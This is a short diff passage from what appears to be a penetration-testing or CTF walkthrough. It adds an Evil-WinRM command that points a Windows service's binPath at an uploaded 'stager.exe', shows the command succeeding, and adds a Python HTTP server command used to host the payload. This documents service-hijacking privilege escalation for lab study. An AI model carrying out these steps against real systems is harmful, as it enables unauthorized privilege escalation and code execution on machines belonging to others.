@@ -1190,5 +1190,14 @@ Info: Upload successful!
 ```
 
 ```python
-
+*Evil-WinRM* PS C:\Program Files\PrintNotify> sc.exe config PrintNotifyService binPath= "C:\Program Files\PrintNotify\stager.exe"
+[SC] ChangeServiceConfig SUCCESS
 ```
+
+Then after uploading ill change the `binPath`
+
+```python
+python3 -m http.server 80
+```
+
+
